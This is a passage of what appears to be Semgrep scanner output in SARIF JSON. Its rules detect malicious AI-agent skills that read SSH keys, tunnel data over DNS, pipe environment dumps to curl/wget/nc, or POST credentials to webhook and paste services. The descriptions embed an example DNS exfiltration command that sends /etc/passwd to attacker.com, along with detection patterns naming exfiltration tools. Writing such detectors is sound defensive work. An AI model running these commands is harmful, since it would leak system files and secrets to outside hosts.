ill-ssh-private-key-read.skill-ssh-private-key-read","properties":{"precision":"very-high","tags":["CWE-522: Insufficiently Protected Credentials","MEDIUM CONFIDENCE","OWASP-A02:2017 - Broken Authentication","OWASP-A04:2021 - Insecure Design","OWASP-A06:2025 - Insecure Design","security"]},"shortDescription":{"text":"Semgrep Finding: skills.credential-access.skill-ssh-private-key-read.skill-ssh-private-key-read"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Suspicious DNS query pattern with command substitution or encoded data found. This pattern warrants investigation as a possible DNS tunneling or covert exfiltration technique — data encoded into subdomain labels (e.g., nslookup \"$(cat /etc/passwd | base64)\".attacker.com) bypasses many firewalls. Verify whether the query target is attacker-controlled or a legitimate service."},"help":{"markdown":"Suspicious DNS query pattern with command substitution or encoded data found. This pattern warrants investigation as a possible DNS tunneling or covert exfiltration technique — data encoded into subdomain labels (e.g., nslookup \"$(cat /etc/passwd | base64)\".attacker.com) bypasses many firewalls. Verify whether the query target is attacker-controlled or a legitimate service.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/skills.exfiltration.skill-dns-exfiltration.skill-dns-exfiltration)\n - [https://attack.mitre.org/techniques/T1048/001/](https://attack.mitre.org/techniques/T1048/001/)\n - [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)\n - [https://owasp.org/Top10/A01_2021-Broken_Access_Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)\n - [https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)\n","text":"Suspicious DNS query pattern with command substitution or encoded data found. This pattern warrants investigation as a possible DNS tunneling or covert exfiltration technique — data encoded into subdomain labels (e.g., nslookup \"$(cat /etc/passwd | base64)\".attacker.com) bypasses many firewalls. Verify whether the query target is attacker-controlled or a legitimate service."},"helpUri":"https://semgrep.dev/r/skills.exfiltration.skill-dns-exfiltration.skill-dns-exfiltration","id":"skills.exfiltration.skill-dns-exfiltration.skill-dns-exfiltration","name":"skills.exfiltration.skill-dns-exfiltration.skill-dns-exfiltration","properties":{"precision":"very-high","tags":["CWE-200: Exposure of Sensitive Information to an Unauthorized Actor","MEDIUM CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","security"]},"shortDescription":{"text":"Semgrep Finding: skills.exfiltration.skill-dns-exfiltration.skill-dns-exfiltration"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Full environment variable dump piped to network tool detected. The `env`\nor `printenv` command dumps ALL environment variables and piping them\ndirectly to curl/wget/nc sends the complete runtime context including all\nAPI keys, tokens, cloud credentials, and database URIs to an external host.\n\nThis differs from targeted grep-based harvesting: a full env dump captures\nevery secret in the process environment, including ones the attacker may\nnot have known to look for.\n\nIMPACT: Mass exfiltration of all runtime secrets and configuration\n"},"help":{"markdown":"Full environment variable dump piped to network tool detected. The `env`\nor `printenv` command dumps ALL environment variables and piping them\ndirectly to curl/wget/nc sends the complete runtime context including all\nAPI keys, tokens, cloud credentials, and database URIs to an external host.\n\nThis differs from targeted grep-based harvesting: a full env dump captures\nevery secret in the process environment, including ones the attacker may\nnot have known to look for.\n\nIMPACT: Mass exfiltration of all runtime secrets and configuration\n\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/skills.exfiltration.skill-env-dump-to-network.skill-env-dump-to-network)\n - [https://attack.mitre.org/techniques/T1552/](https://attack.mitre.org/techniques/T1552/)\n - [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)\n - [https://owasp.org/Top10/A01_2021-Broken_Access_Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)\n - [https://www.elastic.co/guide/en/security/current/potential-data-exfiltration-through-curl.html](https://www.elastic.co/guide/en/security/current/potential-data-exfiltration-through-curl.html)\n","text":"Full environment variable dump piped to network tool detected. The `env`\nor `printenv` command dumps ALL environment variables and piping them\ndirectly to curl/wget/nc sends the complete runtime context including all\nAPI keys, tokens, cloud credentials, and database URIs to an external host.\n\nThis differs from targeted grep-based harvesting: a full env dump captures\nevery secret in the process environment, including ones the attacker may\nnot have known to look for.\n\nIMPACT: Mass exfiltration of all runtime secrets and configuration\n"},"helpUri":"https://semgrep.dev/r/skills.exfiltration.skill-env-dump-to-network.skill-env-dump-to-network","id":"skills.exfiltration.skill-env-dump-to-network.skill-env-dump-to-network","name":"skills.exfiltration.skill-env-dump-to-network.skill-env-dump-to-network","properties":{"precision":"very-high","tags":["CWE-200: Exposure of Sensitive Information to an Unauthorized Actor","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","security"]},"shortDescription":{"text":"Semgrep Finding: skills.exfiltration.skill-env-dump-to-network.skill-env-dump-to-network"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"HTTP POST to a known data exfiltration or command-and-control destination\ndetected. This skill sends data to a domain commonly used for C2\ncommunication (Discord webhooks, Telegram bots, Pastebin, ngrok tunnels,\nrequestbin) or includes sensitive credential field names in the POST body\n(password, secret, token, api_key, private_key).\n\nLegitimate integrations rarely POST to these generic exfiltration\ninfrastructure services. Review whether this skill is exfiltrating\ncaptured data to an attacker-controlled endpoint.\n\nIMPACT: Exfiltration of credentials, PII, or other sensitive data collected\nby the agent to an external attacker-controlled host.\n"},"help":{"markdown":"HTTP POST to a known data exfiltration or command-and-control destination\ndetected. This skill sends data to a domain commonly used for C2\ncommunication (Discord webhooks, Telegram bots, Pastebin, ngrok tunnels,\nrequestbin) or includes sensitive credential field names in the POST body\n(password, secret, token, api_key, private_key).\n\nLegitimate integrations rarely POST to these generic exfiltration\ninfrastructure services. Review whether this skill is exfiltrating\ncaptured data to an attacker-controlled endpoint.\n\nIMPACT: Exfiltration of credentials, PII, or other sensitive data collected\nby the agent to an external attacker-controlled host.\n\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/skills.exfiltration.skill-post-to-exfil-destination.skill-post-to-exfil-destination)\n - [https://attack.mitre.org/techniques/T1041/](https://attack.mitre.org/techniques/T1041/)\n - [https://cwe.mitre.org/data/definitions/200.html](https://cwe.mitre.org/data/definitions/200.html)\n - [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)\n - [https://owasp.org/Top10/A01_2021-Broken_Access_Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)\n - [https://snyk.io/blog/toxic